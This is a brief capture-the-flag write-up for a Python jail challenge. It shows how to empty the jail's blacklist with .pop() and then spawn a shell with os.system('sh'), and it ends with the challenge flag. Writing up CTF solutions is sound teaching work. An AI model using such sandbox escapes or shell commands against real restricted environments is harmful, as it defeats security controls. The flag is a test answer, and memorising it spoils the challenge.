# Big Blacklist | NoobMaster
- Description: That's a big blacklist for a pyjail challenge, don't you think?
# Writeup
Almost everything is blacklisted, but we can use .pop()
.pop() gives the last value of an array and removes it. We can use this code - 
```py
[blacklist.pop() for i in range(len(blacklist))]
```
This removes everything in the blacklist. Then you can do a simple import os and os.system('sh') - 
```py
import os;os.system('sh')
```

# Flag - n00bz{blacklist.pop()_ftw!_7a5d2f8b}
